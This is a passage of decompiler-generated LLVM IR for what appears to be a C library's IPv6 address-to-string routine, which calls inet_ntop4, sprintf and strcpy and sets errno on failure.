  %v2_8055f37 = zext i32 %v0_8055f4b71 to i64
  %v4_8055f37 = zext i32 %v1_8055f36 to i64
  %v5_8055f37 = mul nuw i64 %v4_8055f37, 4294967296
  %v6_8055f37 = or i64 %v5_8055f37, %v2_8055f37
  %v8_8055f37 = sdiv i64 %v6_8055f37, 2
  %v9_8055f37 = trunc i64 %v8_8055f37 to i32
  store i32 %v9_8055f37, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8055f37, i32* %ebx.global-to-local, align 4
  %v2_8055f3f = add i32 %v0_8055f4b71, %arg2
  %v3_8055f3f = inttoptr i32 %v2_8055f3f to i8*
  %v4_8055f3f = load i8, i8* %v3_8055f3f, align 1
  %v5_8055f3f = zext i8 %v4_8055f3f to i32
  store i32 %v5_8055f3f, i32* %eax.global-to-local, align 4
  %v3_8055f43 = add i32 %v2_8055f43, %v0_8055f4b71
  %v4_8055f43 = inttoptr i32 %v3_8055f43 to i8*
  %v5_8055f43 = load i8, i8* %v4_8055f43, align 1
  %v6_8055f43 = zext i8 %v5_8055f43 to i32
  store i32 %v6_8055f43, i32* %edx.global-to-local, align 4
  %v2_8055f48 = mul nuw nsw i32 %v5_8055f3f, 256
  %v1_8055f4b = add i32 %v0_8055f4b71, 2
  store i32 %v1_8055f4b, i32* %ecx.global-to-local, align 4
  %v2_8055f4e = or i32 %v6_8055f43, %v2_8055f48
  store i32 %v2_8055f4e, i32* %eax.global-to-local, align 4
  %v3_8055f50 = mul i32 %v9_8055f37, 4
  %v4_8055f50 = add i32 %v3_8055f50, 60
  %v5_8055f50 = add i32 %v4_8055f50, %v1_8055f50
  %v6_8055f50 = inttoptr i32 %v5_8055f50 to i32*
  store i32 %v2_8055f4e, i32* %v6_8055f50, align 4
  %v0_8055f54.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8055f57 = icmp sgt i32 %v0_8055f54.pre, 15
  br i1 %v7_8055f57, label %dec_label_pc_8055f59, label %dec_label_pc_8055f2d.dec_label_pc_8055f2d_crit_edge

dec_label_pc_8055f2d.dec_label_pc_8055f2d_crit_edge: ; preds = %dec_label_pc_8055f2d
  %v1_8055f50.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055f2d

dec_label_pc_8055f59:                             ; preds = %dec_label_pc_8055f2d
  %v4_8055f17 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8055f63.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055f63

dec_label_pc_8055f63:                             ; preds = %dec_label_pc_8055f59, %dec_label_pc_8055f90
  %v0_8055f9070 = phi i32 [ 0, %dec_label_pc_8055f59 ], [ %v1_8055f90, %dec_label_pc_8055f90 ]
  %v0_8055f7b69 = phi i32 [ -1, %dec_label_pc_8055f59 ], [ %v0_8055f7b7, %dec_label_pc_8055f90 ]
  %v0_8055f9b68 = phi i32 [ -1, %dec_label_pc_8055f59 ], [ %v0_8055f808, %dec_label_pc_8055f90 ]
  %v0_8055fa667 = phi i32 [ -1, %dec_label_pc_8055f59 ], [ %v0_8055f8b12, %dec_label_pc_8055f90 ]
  %v2_8055f63 = mul nuw nsw i32 %v0_8055f9070, 4
  %v3_8055f63 = add nuw nsw i32 %v2_8055f63, 60
  %v4_8055f63 = add i32 %v3_8055f63, %v0_8055f63.pre
  %v5_8055f63 = inttoptr i32 %v4_8055f63 to i32*
  %v6_8055f63 = load i32, i32* %v5_8055f63, align 4
  %v7_8055f63 = icmp eq i32 %v6_8055f63, 0
  %v1_8055f68 = icmp eq i1 %v7_8055f63, false
  %v10_8055f7b = icmp eq i32 %v0_8055f7b69, -1
  br i1 %v1_8055f68, label %dec_label_pc_8055f7b, label %dec_label_pc_8055f6a

dec_label_pc_8055f6a:                             ; preds = %dec_label_pc_8055f63
  %v1_8055f6d = icmp eq i1 %v10_8055f7b, false
  br i1 %v1_8055f6d, label %dec_label_pc_8055f78, label %dec_label_pc_8055f6f

dec_label_pc_8055f6f:                             ; preds = %dec_label_pc_8055f6a
  store i32 %v0_8055f9070, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055f90

dec_label_pc_8055f78:                             ; preds = %dec_label_pc_8055f6a
  %v0_8055f78 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055f78 = add i32 %v0_8055f78, 1
  store i32 %v1_8055f78, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055f90

dec_label_pc_8055f7b:                             ; preds = %dec_label_pc_8055f63
  br i1 %v10_8055f7b, label %dec_label_pc_8055f90, label %dec_label_pc_8055f80

dec_label_pc_8055f80:                             ; preds = %dec_label_pc_8055f7b
  %v10_8055f80 = icmp eq i32 %v0_8055f9b68, -1
  %v0_8055f89.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055f85 = load i32, i32* @ebp, align 4
  %v7_8055f87 = icmp sgt i32 %v0_8055f89.pre, %v1_8055f85
  %or.cond = or i1 %v10_8055f80, %v7_8055f87
  br i1 %or.cond, label %dec_label_pc_8055f89, label %dec_label_pc_8055f8d

dec_label_pc_8055f89:                             ; preds = %dec_label_pc_8055f80
  store i32 %v0_8055f89.pre, i32* @ebp, align 4
  store i32 %v0_8055fa667, i32* @edi, align 4
  br label %dec_label_pc_8055f8d

dec_label_pc_8055f8d:                             ; preds = %dec_label_pc_8055f80, %dec_label_pc_8055f89
  %v0_8055f8010 = phi i32 [ %v0_8055fa667, %dec_label_pc_8055f89 ], [ %v0_8055f9b68, %dec_label_pc_8055f80 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f90

dec_label_pc_8055f90:                             ; preds = %dec_label_pc_8055f7b, %dec_label_pc_8055f78, %dec_label_pc_8055f6f, %dec_label_pc_8055f8d
  %v0_8055f8b12 = phi i32 [ %v0_8055fa667, %dec_label_pc_8055f7b ], [ %v0_8055fa667, %dec_label_pc_8055f78 ], [ %v0_8055f9070, %dec_label_pc_8055f6f ], [ -1, %dec_label_pc_8055f8d ]
  %v0_8055f7b7 = phi i32 [ -1, %dec_label_pc_8055f7b ], [ %v0_8055f7b69, %dec_label_pc_8055f78 ], [ %v0_8055f9070, %dec_label_pc_8055f6f ], [ -1, %dec_label_pc_8055f8d ]
  %v0_8055f808 = phi i32 [ %v0_8055f9b68, %dec_label_pc_8055f7b ], [ %v0_8055f9b68, %dec_label_pc_8055f78 ], [ %v0_8055f9b68, %dec_label_pc_8055f6f ], [ %v0_8055f8010, %dec_label_pc_8055f8d ]
  %v1_8055f90 = add nuw nsw i32 %v0_8055f9070, 1
  store i32 %v1_8055f90, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8055f90, 8
  br i1 %exitcond, label %dec_label_pc_8055f96, label %dec_label_pc_8055f63

dec_label_pc_8055f96:                             ; preds = %dec_label_pc_8055f90
  %v10_8055f96 = icmp eq i32 %v0_8055f8b12, -1
  br i1 %v10_8055f96, label %dec_label_pc_8055fa8, label %dec_label_pc_8055f9b

dec_label_pc_8055f9b:                             ; preds = %dec_label_pc_8055f96
  %v10_8055f9b = icmp eq i32 %v0_8055f808, -1
  %v0_8055fa4.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8055f9b, label %dec_label_pc_8055fa4, label %dec_label_pc_8055fa0

dec_label_pc_8055fa0:                             ; preds = %dec_label_pc_8055f9b
  %v1_8055fa0 = load i32, i32* @ebp, align 4
  %v7_8055fa2 = icmp sgt i32 %v0_8055fa4.pre, %v1_8055fa0
  br i1 %v7_8055fa2, label %dec_label_pc_8055fa4, label %dec_label_pc_8055fa8.thread

dec_label_pc_8055fa8.thread:                      ; preds = %dec_label_pc_8055fa0
  br label %dec_label_pc_8055fad

dec_label_pc_8055fa4:                             ; preds = %dec_label_pc_8055f9b, %dec_label_pc_8055fa0
  store i32 %v0_8055fa4.pre, i32* @ebp, align 4
  store i32 %v0_8055f8b12, i32* @edi, align 4
  br label %dec_label_pc_8055fa8

dec_label_pc_8055fa8:                             ; preds = %dec_label_pc_8055f96, %dec_label_pc_8055fa4
  %v0_8055fa8 = phi i32 [ %v0_8055f808, %dec_label_pc_8055f96 ], [ %v0_8055f8b12, %dec_label_pc_8055fa4 ]
  %v10_8055fa8 = icmp eq i32 %v0_8055fa8, -1
  br i1 %v10_8055fa8, label %dec_label_pc_8055fb5, label %dec_label_pc_8055fa8.dec_label_pc_8055fad_crit_edge

dec_label_pc_8055fa8.dec_label_pc_8055fad_crit_edge: ; preds = %dec_label_pc_8055fa8
  %v0_8055fad.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8055fad

dec_label_pc_8055fad:                             ; preds = %dec_label_pc_8055fa8.dec_label_pc_8055fad_crit_edge, %dec_label_pc_8055fa8.thread
  %v0_8055fad = phi i32 [ %v1_8055fa0, %dec_label_pc_8055fa8.thread ], [ %v0_8055fad.pre, %dec_label_pc_8055fa8.dec_label_pc_8055fad_crit_edge ]
  %v0_8055fa848 = phi i32 [ %v0_8055f808, %dec_label_pc_8055fa8.thread ], [ %v0_8055fa8, %dec_label_pc_8055fa8.dec_label_pc_8055fad_crit_edge ]
  %v1_8055fad = add i32 %v0_8055fad, -1
  %v6_8055fad = sub i32 0, %v0_8055fad
  %v7_8055fad = and i32 %v0_8055fad, %v6_8055fad
  %v8_8055fad = icmp slt i32 %v7_8055fad, 0
  %v9_8055fad = icmp eq i32 %v1_8055fad, 0
  %v10_8055fad = icmp slt i32 %v1_8055fad, 0
  %v3_8055fb0 = icmp eq i1 %v10_8055fad, %v8_8055fad
  %v4_8055fb0 = icmp eq i1 %v9_8055fad, false
  %v5_8055fb0 = and i1 %v4_8055fb0, %v3_8055fb0
  br i1 %v5_8055fb0, label %dec_label_pc_8055fb5, label %dec_label_pc_8055fb2

dec_label_pc_8055fb2:                             ; preds = %dec_label_pc_8055fad
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8055fb5

dec_label_pc_8055fb5:                             ; preds = %dec_label_pc_8055fad, %dec_label_pc_8055fa8, %dec_label_pc_8055fb2
  %v0_805605517 = phi i32 [ %v0_8055fa848, %dec_label_pc_8055fad ], [ -1, %dec_label_pc_8055fa8 ], [ -1, %dec_label_pc_8055fb2 ]
  %v2_8055fb5 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8055fb5, i32* @ebx, align 4
  %v3_8056037 = add i32 %v4_8055f17, 64
  %v12_8055ff5 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805605560 = icmp eq i32 %v0_805605517, -1
  %v1_8055ffd = icmp eq i1 %v12_8055ff5, false
  br label %dec_label_pc_8055fc0

dec_label_pc_8055fc0:                             ; preds = %dec_label_pc_8055fb5, %dec_label_pc_805604b
  %v10_805605566 = phi i1 [ %v10_805605560, %dec_label_pc_8055fb5 ], [ %v10_8056055, %dec_label_pc_805604b ]
  %v0_8055fda65 = phi i32 [ 0, %dec_label_pc_8055fb5 ], [ %v1_805604b, %dec_label_pc_805604b ]
  %v1_8055fd064 = phi i32 [ %v0_805605517, %dec_label_pc_8055fb5 ], [ %v0_8056055.pre, %dec_label_pc_805604b ]
  %v0_8055fde63 = phi i32 [ %v2_8055fb5, %dec_label_pc_8055fb5 ], [ %v0_8055fd418, %dec_label_pc_805604b ]
  %stack_var_-120.162 = phi i8* [ null, %dec_label_pc_8055fb5 ], [ %stack_var_-120.0, %dec_label_pc_805604b ]
  %stack_var_-116.161 = phi i32 [ 32, %dec_label_pc_8055fb5 ], [ %stack_var_-116.0, %dec_label_pc_805604b ]
  br i1 %v10_805605566, label %dec_label_pc_8055fda, label %dec_label_pc_8055fc5

dec_label_pc_8055fc5:                             ; preds = %dec_label_pc_8055fc0
  %v12_8055fc5 = icmp eq i32 %v0_8055fda65, %v1_8055fd064
  %v5_8055fc7 = icmp slt i32 %v0_8055fda65, %v1_8055fd064
  br i1 %v5_8055fc7, label %dec_label_pc_8055fda, label %dec_label_pc_8055fc9

dec_label_pc_8055fc9:                             ; preds = %dec_label_pc_8055fc5
  %v1_8055fc9 = load i32, i32* @ebp, align 4
  %v2_8055fc9 = add i32 %v1_8055fc9, %v1_8055fd064
  store i32 %v2_8055fc9, i32* %eax.global-to-local, align 4
  %v5_8055fce = icmp slt i32 %v0_8055fda65, %v2_8055fc9
  br i1 %v5_8055fce, label %dec_label_pc_8055fd0, label %dec_label_pc_8055fda

dec_label_pc_8055fd0:                             ; preds = %dec_label_pc_8055fc9
  %v1_8055fd2 = icmp eq i1 %v12_8055fc5, false
  br i1 %v1_8055fd2, label %dec_label_pc_805604b, label %dec_label_pc_8055fd4

dec_label_pc_8055fd4:                             ; preds = %dec_label_pc_8055fd0
  %v1_8055fd4 = inttoptr i32 %v0_8055fde63 to i8*
  store i8 58, i8* %v1_8055fd4, align 1
  %v0_8055fd7 = load i32, i32* @ebx, align 4
  %v1_8055fd7 = add i32 %v0_8055fd7, 1
  store i32 %v1_8055fd7, i32* @ebx, align 4
  br label %dec_label_pc_805604b

dec_label_pc_8055fda:                             ; preds = %dec_label_pc_8055fc9, %dec_label_pc_8055fc5, %dec_label_pc_8055fc0
  %v1_8055fda = icmp eq i32 %v0_8055fda65, 0
  br i1 %v1_8055fda, label %dec_label_pc_8055fe2.thread, label %dec_label_pc_8055fe2

dec_label_pc_8055fe2.thread:                      ; preds = %dec_label_pc_8055fda
  br label %dec_label_pc_8056036

dec_label_pc_8055fe2:                             ; preds = %dec_label_pc_8055fda
  %v1_8055fde = inttoptr i32 %v0_8055fde63 to i8*
  store i8 58, i8* %v1_8055fde, align 1
  %v0_8055fe1 = load i32, i32* @ebx, align 4
  %v1_8055fe1 = add i32 %v0_8055fe1, 1
  store i32 %v1_8055fe1, i32* @ebx, align 4
  %v0_8055fe2.pre = load i32, i32* @esi, align 4
  %v9_8055fe2 = icmp eq i32 %v0_8055fe2.pre, 6
  %v1_8055fe5 = icmp eq i1 %v9_8055fe2, false
  br i1 %v1_8055fe5, label %dec_label_pc_8056036, label %dec_label_pc_8055fe7

dec_label_pc_8055fe7:                             ; preds = %dec_label_pc_8055fe2
  %v0_8055fe7 = load i32, i32* @edi, align 4
  %v1_8055fe7 = icmp eq i32 %v0_8055fe7, 0
  %v1_8055fe9 = icmp eq i1 %v1_8055fe7, false
  br i1 %v1_8055fe9, label %dec_label_pc_8056036, label %dec_label_pc_8055feb

dec_label_pc_8055feb:                             ; preds = %dec_label_pc_8055fe7
  %v0_8055feb = load i32, i32* @ebp, align 4
  %v9_8055feb = icmp eq i32 %v0_8055feb, 6
  br i1 %v9_8055feb, label %dec_label_pc_8055fff, label %dec_label_pc_8055ff0

dec_label_pc_8055ff0:                             ; preds = %dec_label_pc_8055feb
  %v9_8055ff0 = icmp eq i32 %v0_8055feb, 5
  %v1_8055ff3 = icmp eq i1 %v9_8055ff0, false
  br i1 %v1_8055ff3, label %dec_label_pc_8056036, label %dec_label_pc_8055ff5

dec_label_pc_8055ff5:                             ; preds = %dec_label_pc_8055ff0
  br i1 %v1_8055ffd, label %dec_label_pc_8056036, label %dec_label_pc_8055fff

dec_label_pc_8055fff:                             ; preds = %dec_label_pc_8055ff5, %dec_label_pc_8055feb
  %v2_8056005 = sub i32 %v1_8055fe1, %v2_8055fb5
  store i32 %v2_8056005, i32* @esi, align 4
  %v2_8056010 = sub i32 46, %v2_8056005
  store i32 %v2_8056010, i32* @ecx, align 4
  %v1_8056012 = add i32 %arg2, 12
  store i32 %v1_8056012, i32* @eax, align 4
  store i32 %v1_8055fe1, i32* @edx, align 4
  %v0_8056017 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056017 = ptrtoint i8* %v0_8056017 to i32
  %v3_8056017 = ptrtoint i8* %stack_var_-120.162 to i32
  %v5_8056017 = call i32 @inet_ntop4(i32 %v1_8056017, i32 %v3_8056017, i32 %stack_var_-116.161)
  store i32 %v5_8056017, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805601e = icmp eq i32 %v5_8056017, 0
  br i1 %v1_805601e, label %dec_label_pc_80560a8, label %dec_label_pc_8056026

dec_label_pc_8056026:                             ; preds = %dec_label_pc_8055fff
  %v0_8056029 = load i32, i32* @ebx, align 4
  %v5_8056029 = inttoptr i32 %v0_8056029 to i8*
  store i8* %v5_8056029, i8** %stack_var_-124, align 4
  %v3_805602a = call i32 @strlen(i8* %v5_8056029)
  store i32 %v3_805602a, i32* %eax.global-to-local, align 4
  %v0_8056032 = load i32, i32* @ebx, align 4
  %v3_8056032 = add i32 %v0_8056032, %v3_805602a
  store i32 %v3_8056032, i32* @ebx, align 4
  %v0_805605a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805605a

dec_label_pc_8056036:                             ; preds = %dec_label_pc_8055fe2.thread, %dec_label_pc_8055ff5, %dec_label_pc_8055ff0, %dec_label_pc_8055fe7, %dec_label_pc_8055fe2
  %v1_805603753 = phi i32 [ 0, %dec_label_pc_8055fe2.thread ], [ %v0_8055fe2.pre, %dec_label_pc_8055ff5 ], [ %v0_8055fe2.pre, %dec_label_pc_8055ff0 ], [ %v0_8055fe2.pre, %dec_label_pc_8055fe7 ], [ %v0_8055fe2.pre, %dec_label_pc_8055fe2 ]
  %v0_805604052 = phi i32 [ %v0_8055fde63, %dec_label_pc_8055fe2.thread ], [ %v1_8055fe1, %dec_label_pc_8055ff5 ], [ %v1_8055fe1, %dec_label_pc_8055ff0 ], [ %v1_8055fe1, %dec_label_pc_8055fe7 ], [ %v1_8055fe1, %dec_label_pc_8055fe2 ]
  %v0_8056036 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8056036, i32* %stack_var_-112, align 4
  %v2_8056037 = mul i32 %v1_805603753, 4
  %v4_8056037 = add i32 %v3_8056037, %v2_8056037
  %v5_8056037 = inttoptr i32 %v4_8056037 to i32*
  %v6_8056037 = load i32, i32* %v5_8056037, align 4
  %v5_8056040 = inttoptr i32 %v0_805604052 to i8*
  store i8* %v5_8056040, i8** %stack_var_-124, align 4
  %v6_8056041 = call i32 @sprintf(i32 %v0_805604052, i32 ptrtoint ([3 x i8]* @global_var_8060f91.803 to i32), i32 %v6_8056037, i32 %v0_8056036)
  store i32 %v6_8056041, i32* %eax.global-to-local, align 4
  %v0_8056049 = load i32, i32* @ebx, align 4
  %v2_8056049 = add i32 %v0_8056049, %v6_8056041
  store i32 %v2_8056049, i32* @ebx, align 4
  br label %dec_label_pc_805604b

dec_label_pc_805604b:                             ; preds = %dec_label_pc_8055fd0, %dec_label_pc_8055fd4, %dec_label_pc_8056036
  %stack_var_-116.0 = phi i32 [ %v6_8056037, %dec_label_pc_8056036 ], [ %stack_var_-116.161, %dec_label_pc_8055fd0 ], [ %stack_var_-116.161, %dec_label_pc_8055fd4 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8060f91.803, i32 0, i32 0), %dec_label_pc_8056036 ], [ %stack_var_-120.162, %dec_label_pc_8055fd0 ], [ %stack_var_-120.162, %dec_label_pc_8055fd4 ]
  %v0_8055fd418 = phi i32 [ %v2_8056049, %dec_label_pc_8056036 ], [ %v0_8055fde63, %dec_label_pc_8055fd0 ], [ %v1_8055fd7, %dec_label_pc_8055fd4 ]
  %v0_805604b = load i32, i32* @esi, align 4
  %v1_805604b = add i32 %v0_805604b, 1
  %v0_8056055.pre = load i32, i32* @edi, align 4
  store i32 %v1_805604b, i32* @esi, align 4
  %v7_805604f = icmp sgt i32 %v1_805604b, 7
  %v10_8056055 = icmp eq i32 %v0_8056055.pre, -1
  br i1 %v7_805604f, label %dec_label_pc_8056055, label %dec_label_pc_8055fc0

dec_label_pc_8056055:                             ; preds = %dec_label_pc_805604b
  br i1 %v10_8056055, label %dec_label_pc_8056066, label %dec_label_pc_805605a

dec_label_pc_805605a:                             ; preds = %dec_label_pc_8056055, %dec_label_pc_8056026
  %v0_8056062 = phi i32 [ %v0_8055fd418, %dec_label_pc_8056055 ], [ %v3_8056032, %dec_label_pc_8056026 ]
  %v0_805605a = phi i32 [ %v0_8056055.pre, %dec_label_pc_8056055 ], [ %v0_805605a.pre, %dec_label_pc_8056026 ]
  %v1_805605a = load i32, i32* @ebp, align 4
  %v2_805605a = add i32 %v1_805605a, %v0_805605a
  store i32 %v2_805605a, i32* %eax.global-to-local, align 4
  %v9_805605d = icmp eq i32 %v2_805605a, 8
  %v1_8056060 = icmp eq i1 %v9_805605d, false
  br i1 %v1_8056060, label %dec_label_pc_8056066, label %dec_label_pc_8056062

dec_label_pc_8056062:                             ; preds = %dec_label_pc_805605a
  %v1_8056062 = inttoptr i32 %v0_8056062 to i8*
  store i8 58, i8* %v1_8056062, align 1
  %v0_8056065 = load i32, i32* @ebx, align 4
  %v1_8056065 = add i32 %v0_8056065, 1
  store i32 %v1_8056065, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056066

dec_label_pc_8056066:                             ; preds = %dec_label_pc_805605a, %dec_label_pc_8056055, %dec_label_pc_8056062
  %v0_805606a = phi i32 [ %v0_8056062, %dec_label_pc_805605a ], [ %v0_8055fd418, %dec_label_pc_8056055 ], [ %v1_8056065, %dec_label_pc_8056062 ]
  store i32 %v2_8055fb5, i32* %edx.global-to-local, align 4
  %v1_805606a = add i32 %v0_805606a, 1
  store i32 %v1_805606a, i32* %eax.global-to-local, align 4
  %v1_805606d = inttoptr i32 %v0_805606a to i8*
  store i8 0, i8* %v1_805606d, align 1
  %v0_8056070 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056070 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056070 = sub i32 %v0_8056070, %v1_8056070
  store i32 %v2_8056070, i32* @eax, align 4
  %tmp77 = icmp ugt i32 %v2_8056070, %arg4
  br i1 %tmp77, label %dec_label_pc_8056078, label %dec_label_pc_8056085

dec_label_pc_8056078:                             ; preds = %dec_label_pc_8056066
  %v0_8056078 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056078 = ptrtoint i8* %v0_8056078 to i32
  %v2_8056078 = call i32 @__errno_location(i32 %v1_8056078)
  store i32 %v2_8056078, i32* %eax.global-to-local, align 4
  %v1_805607d = inttoptr i32 %v2_8056078 to i32*
  store i32 28, i32* %v1_805607d, align 4
  br label %dec_label_pc_80560a6

dec_label_pc_8056085:                             ; preds = %dec_label_pc_8056066
  %v0_8056085 = load i32, i32* @edi, align 4
  store i32 %v0_8056085, i32* %stack_var_-112, align 4
  %tmp44 = bitcast i8** %stack_var_12 to i32*
  %v3_80560881 = load i32, i32* %tmp44, align 4
  %tmp45 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80560881, i32* %tmp45, align 4
  %v0_805608f.cast = inttoptr i32 %v3_80560881 to i8*
  %v5_805608f = call i32 @strcpy(i8* %v0_805608f.cast, i32 %v2_8055fb5)
  store i32 %v5_805608f, i32* %eax.global-to-local, align 4
  store i32 %v5_805608f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80560a8

dec_label_pc_805609b:                             ; preds = %dec_label_pc_8055ef4
  %v1_805609b = call i32 @__errno_location(i32 %v0_8055ee7)
  store i32 %v1_805609b, i32* %eax.global-to-local, align 4
  %v1_80560a0 = inttoptr i32 %v1_805609b to i32*
  store i32 97, i32* %v1_80560a0, align 4
  br label %dec_label_pc_80560a6

dec_label_pc_80560a6:                             ; preds = %dec_label_pc_8056078, %dec_label_pc_805609b
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80560a8

dec_label_pc_80560a8:                             ; preds = %dec_label_pc_8055fff, %dec_label_pc_8056085, %dec_label_pc_8055eff, %dec_label_pc_80560a6
  %v0_80560ab = phi i32 [ 0, %dec_label_pc_8055fff ], [ %v5_805608f, %dec_label_pc_8056085 ], [ %v3_8055f0b, %dec_label_pc_8055eff ], [ 0, %dec_label_pc_80560a6 ]
  store i32 %v0_80560ab, i32* %eax.global-to-local, align 4
  store i32 %v0_8055ee7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80560ab

; uselistorder directives
  uselistorder i32 %v0_80560ab, { 1, 0 }
  uselistorder i32 %v0_805606a, { 1, 0 }
  uselistorder i32 %v1_805604b, { 1, 0, 2 }
  uselistorder i32 %v0_805604052, { 1, 0 }
  uselistorder i32 %v0_8055fe2.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8055fe1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.161, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.162, { 2, 1, 0 }
  uselistorder i32 %v0_8055fde63, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8055fd064, { 2, 0, 1 }
  uselistorder i32 %v0_8055fda65, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8055fb5, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8055fad, { 1, 0 }
  uselistorder i32 %v0_8055fad, { 1, 2, 0 }
  uselistorder i32 %v1_8055f90, { 0, 2, 1 }
  uselistorder i32 %v0_8055f808, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055f8b12, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8055f7b, { 1, 0 }
  uselistorder i32 %v0_8055fa667, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055f9b68, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8055f9070, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8055f4b71, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8055ee7, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 4, 2, 5, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_8060f91.803, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 1, 0, 3, 4, 2 }
  uselistorder i32 64, { 7, 3, 0, 6, 8, 5, 2, 4, 1 }
  uselistorder i32* @esp, { 0, 1, 74, 75, 76, 77, 78, 79, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 15, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 11, 300, 301, 302, 12, 303, 9, 304, 305, 306, 307, 308, 309, 13, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 10, 323, 324, 325, 326, 327, 328, 14, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 200, 2, 3, 357, 4, 5, 6, 16, 201, 202, 203, 204, 17, 205, 206, 207, 208, 209, 19, 210, 211, 212, 21, 213, 22, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 20, 226, 23, 227, 228, 229, 24, 230, 231, 232, 233, 234, 235, 236, 237, 18, 238, 110, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 93, 8, 90, 91, 92, 94, 95, 96, 97, 98, 25, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 115, 7, 116, 117, 118, 119, 123, 120, 121, 122, 124, 125, 127, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 139, 141, 142, 143, 144, 145, 146, 26, 147, 148, 149, 150, 27, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 28, 161, 162, 163, 164, 29, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 30, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 31, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 32, 68, 69, 70, 71, 72, 73, 278, 350, 351, 352, 353, 354, 355, 356 }
  uselistorder i32 15, { 1, 4, 10, 9, 2, 8, 3, 5, 6, 7, 0 }
  uselistorder i32 60, { 5, 6, 3, 7, 8, 4, 1, 2, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 6, 7, 8, 4, 18, 16, 15, 17, 9, 1, 10, 2, 3, 5, 11, 12, 13, 14 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80560a8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80560a6, { 1, 0 }
  uselistorder label %dec_label_pc_8056066, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805604b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056036, { 1, 2, 3, 4, 0 }
